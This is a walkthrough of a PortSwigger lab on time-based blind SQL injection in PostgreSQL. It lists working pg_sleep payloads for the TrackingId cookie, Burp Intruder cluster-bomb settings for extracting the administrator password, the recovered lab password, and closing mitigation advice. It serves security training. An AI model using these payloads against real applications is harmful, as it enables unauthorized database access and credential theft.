# 📘 PortSwigger Lab 012: Blind SQL Injection with Time Delays and Information Retrieval

<a id="top"></a>

> 🔗 Lab: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval

---

# 📑 Contents

- [🎯 Goal](#goal)
- [🧠 Theory](#theory)
- [🔍 Step 1 — Confirm Time-Based SQL Injection](#step1)
- [🔍 Step 2 — Verify the TRUE / FALSE Channel](#step2)
- [🔍 Step 3 — Confirm the administrator User](#step3)
- [🔍 Step 4 — Determine the Password Length](#step4)
- [🔍 Step 5 — Official PortSwigger Password Recovery Method](#step5)
- [⚡ Step 6 — Faster Intruder Cluster Bomb Method](#step6)
- [🔑 Recovered Credentials](#credentials)
- [🧩 Payloads Used](#payloads)
- [💥 Why the Attack Worked](#why)
- [🛡 Mitigation](#mitigation)
- [🛠 Checklist](#checklist)

---

<a id="goal"></a>

# 🎯 Goal

Recover the `administrator` password using time-based blind SQL injection and log in to the application.

---

<a id="theory"></a>

# 🧠 Theory

In this lab, the application does not display SQL errors, does not return query results, and does not visibly change the response when a condition is true or false.

The only useful signal is response time.

```text
TRUE  → response delayed by about 10 seconds
FALSE → immediate response
```

The database is PostgreSQL, so the delay function is:

```sql
pg_sleep(10)
```

The attack works by asking the database small TRUE/FALSE questions and observing whether the HTTP response is delayed.

---

<a id="step1"></a>

# 🔍 Step 1 — Confirm Time-Based SQL Injection

Use this payload in the `TrackingId` cookie:

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

Why this step matters:

- `1=1` is always true.
- If the SQL injection works, PostgreSQL executes `pg_sleep(10)`.
- The HTTP response should be delayed by about 10 seconds.

Expected result:

```text
The response is delayed by about 10 seconds.
```

This confirms that time-based SQL injection is possible.

---

<a id="step2"></a>

# 🔍 Step 2 — Verify the TRUE / FALSE Channel

Now test a false condition:

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

Why this step matters:

- `1=2` is always false.
- The database should execute `pg_sleep(0)`.
- The response should return immediately.

Expected result:

```text
The response returns immediately.
```

Conclusion:

```text
TRUE  → delay
FALSE → no delay
```

Now we have a working boolean channel based on response time.

---

<a id="step3"></a>

# 🔍 Step 3 — Confirm the administrator User

Check whether the `administrator` user exists:

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

Why this step matters:

Before extracting the password, we need to confirm that the target account exists.

Expected result:

```text
The response is delayed by about 10 seconds.
```

Conclusion:

```text
The administrator user exists.
```

---

<a id="step4"></a>

# 🔍 Step 4 — Determine the Password Length

Use `LENGTH(password)` to test the password length:

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>20)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

Test different values:

```text
>10
>15
>19
>20
```

Interpretation:

```text
delay      → condition is TRUE
no delay   → condition is FALSE
```

In this lab:

```text
LENGTH(password)>19 → delay
LENGTH(password)>20 → no delay
```

Conclusion:

```text
Password length = 20 characters
```

---

<a id="step5"></a>

# 🔍 Step 5 — Official PortSwigger Password Recovery Method

The official method tests one password position at a time.

Example for the first character:

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

Meaning:

```text
If the first password character is "a", delay the response by 10 seconds.
```

Use Burp Intruder:

```text
Payload type: Simple list
Payloads: a-z and 0-9
Resource pool: Maximum concurrent requests = 1
```

Then check the `Response received` column.

```text
~100 ms     → wrong character
~10000 ms   → correct character
```

After finding the first character, change the offset:

```sql
SUBSTRING(password,2,1)
SUBSTRING(password,3,1)
...
SUBSTRING(password,20,1)
```

Downside:

```text
This requires 20 separate Intruder runs.
```

---

<a id="step6"></a>

# ⚡ Step 6 — Faster Intruder Cluster Bomb Method

A faster approach is to test all positions in one Intruder attack.

Use two payload positions:

```sql
SUBSTRING(password,§1§,1)='§a§'
```

Full idea:

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,§1§,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

Intruder configuration:

```text
Attack type: Cluster Bomb
```

Payload Set 1:

```text
1
2
3
...
20
```

Payload Set 2:

```text
a
b
c
...
z
0
1
2
...
9
```

Resource Pool:

```text
Maximum concurrent requests = 1
```

Why this matters:

Time-based attacks become unreliable if Burp sends many concurrent requests. Single-threaded execution makes timing results much easier to interpret.

Total requests:

```text
20 × 36 = 720 requests
```

After the attack finishes:

1. Sort by `Response received`.
2. Find all rows around `10000 ms`.
3. Sort those rows by `Payload 1`.
4. Read the character from `Payload 2`.

Recovered password:

```text
ehbq02l9bz5o6py22wtl
```

---

<a id="credentials"></a>

# 🔑 Recovered Credentials

<details>
<summary>Show administrator password</summary>

```text
Username: administrator
Password: ehbq02l9bz5o6py22wtl
```

</details>

---

<a id="payloads"></a>

# 🧩 Payloads Used

Confirm TRUE delay:

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

Confirm FALSE condition:

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

Confirm administrator user:

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

Check password length:

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>20)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

Check a single character:

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

Cluster Bomb version:

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,§1§,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

---

<a id="why"></a>

# 💥 Why the Attack Worked

The attack worked because:

- the `TrackingId` cookie was inserted directly into a SQL query;
- the query was executed synchronously;
- PostgreSQL `pg_sleep()` was available;
- response time became a TRUE/FALSE communication channel;
- the application did not use parameterized queries.

---

<a id="mitigation"></a>

# 🛡 Mitigation

To prevent this vulnerability:

- use prepared statements;
- use parameterized queries;
- avoid string concatenation in SQL;
- apply least privilege to the database user;
- monitor slow and suspicious queries;
- configure query timeouts;
- use WAF rules as an additional layer.

---

<a id="checklist"></a>

# 🛠 Checklist

- [x] Time-based SQL injection confirmed
- [x] TRUE/FALSE timing channel confirmed
- [x] `administrator` user confirmed
- [x] Password length identified
- [x] Password recovered with Intruder
- [x] Login as administrator completed

---

# ⬆ Back to Top

[Back to Contents](#top)
